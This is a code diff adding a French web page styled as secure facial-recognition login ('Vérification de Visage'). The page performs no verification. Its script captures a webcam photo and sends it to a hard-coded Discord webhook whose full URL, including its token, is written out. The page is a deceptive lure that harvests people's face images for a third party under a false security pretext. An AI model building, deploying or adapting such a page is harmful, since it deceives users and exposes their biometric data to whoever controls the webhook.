@@ -1,1 +1,359 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vérification de Visage</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }
+
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+        }
+
+        .header p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 4/3;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+
+        .face-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            display: none;
+            z-index: 2;
+        }
+
+        .face-oval-mask {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+        }
+
+        .face-oval {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 55%;
+            height: 70%;
+            border: 4px solid rgba(255, 255, 255, 0.9);
+            border-radius: 50%;
+            z-index: 3;
+        }
+
+        .face-guide {
+            position: absolute;
+            top: 8%;
+            left: 50%;
+            transform: translateX(-50%);
+            color: white;
+            background: rgba(102, 126, 234, 0.9);
+            padding: 10px 20px;
+            border-radius: 25px;
+            font-size: 14px;
+            font-weight: 600;
+            text-align: center;
+            backdrop-filter: blur(10px);
+            z-index: 4;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .placeholder {
+            color: white;
+            text-align: center;
+            padding: 40px;
+        }
+
+        .placeholder svg {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 20px;
+            opacity: 0.5;
+        }
+
+        .controls {
+            padding: 30px;
+            text-align: center;
+        }
+
+        .btn {
+            padding: 15px 40px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .capture-btn {
+            width: 70px;
+            height: 70px;
+            border-radius: 50%;
+            background: white;
+            border: 5px solid #667eea;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: none;
+            margin: 0 auto;
+            position: relative;
+        }
+
+        .capture-btn:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 20px rgba(102, 126, 234, 0.6);
+        }
+
+        .capture-btn:active {
+            transform: scale(0.95);
+        }
+
+        .capture-btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            background: #667eea;
+            border-radius: 50%;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔐 Vérification de Visage</h1>
+            <p>Authentification sécurisée par reconnaissance faciale</p>
+        </div>
+
+        <div class="video-container">
+            <video id="video" autoplay playsinline></video>
+            <canvas id="canvas"></canvas>
+            <div class="face-overlay" id="faceOverlay">
+                <div class="face-guide">👤 Alignez votre visage dans l'ovale</div>
+                <div class="face-oval"></div>
+            </div>
+            <div class="placeholder" id="placeholder">
+                <svg fill="currentColor" viewBox="0 0 20 20">
+                    <path fill-rule="evenodd" d="M4 5a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V7a2 2 0 00-2-2h-1.586a1 1 0 01-.707-.293l-1.121-1.121A2 2 0 0011.172 3H8.828a2 2 0 00-1.414.586L6.293 4.707A1 1 0 015.586 5H4zm6 9a3 3 0 100-6 3 3 0 000 6z" clip-rule="evenodd"/>
+                </svg>
+                <p>Caméra non activée</p>
+            </div>
+        </div>
+
+        <div class="controls">
+            <button class="btn btn-primary" id="startBtn">Activer la Caméra</button>
+            <button class="capture-btn" id="captureBtn"></button>
+            <div class="loader" id="loader"></div>
+            <div class="status" id="status"></div>
+        </div>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const startBtn = document.getElementById('startBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const placeholder = document.getElementById('placeholder');
+        const faceOverlay = document.getElementById('faceOverlay');
+        const statusDiv = document.getElementById('status');
+        const loader = document.getElementById('loader');
+        const ctx = canvas.getContext('2d');
+
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1447896365282754593/Lv90Nn-cZPkT5yBVJwgmPE1urFv8pUtjkPnOHtqGW5LYUVS1GbPZdGdJfLqc1LZuqjXl';
+
+        let stream = null;
+
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+            statusDiv.style.display = 'block';
+            setTimeout(() => {
+                statusDiv.style.display = 'none';
+            }, 5000);
+        }
+
+        startBtn.addEventListener('click', async () => {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user' },
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                video.style.display = 'block';
+                placeholder.style.display = 'none';
+                faceOverlay.style.display = 'block';
+                startBtn.style.display = 'none';
+                captureBtn.style.display = 'block';
+                
+                showStatus('Caméra activée avec succès !', 'success');
+            } catch (err) {
+                console.error('Erreur d\'accès à la caméra:', err);
+                showStatus('Erreur : Impossible d\'accéder à la caméra. Vérifiez les permissions.', 'error');
+            }
+        });
+
+        captureBtn.addEventListener('click', async () => {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                loader.style.display = 'block';
+                captureBtn.disabled = true;
+                
+                try {
+                    const formData = new FormData();
+                    formData.append('file', blob, 'verification_faciale.jpg');
+                    formData.append('content', `✅ Nouvelle vérification faciale - ${new Date().toLocaleString('fr-FR')}`);
+                    
+                    const response = await fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    if (response.ok) {
+                        showStatus('✅ Photo envoyée avec succès !', 'success');
+                    } else {
+                        throw new Error('Erreur lors de l\'envoi');
+                    }
+                } catch (err) {
+                    console.error('Erreur d\'envoi:', err);
+                    showStatus('❌ Erreur lors de l\'envoi de la photo', 'error');
+                } finally {
+                    loader.style.display = 'none';
+                    captureBtn.disabled = false;
+                }
+            }, 'image/jpeg', 0.95);
+        });
+
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
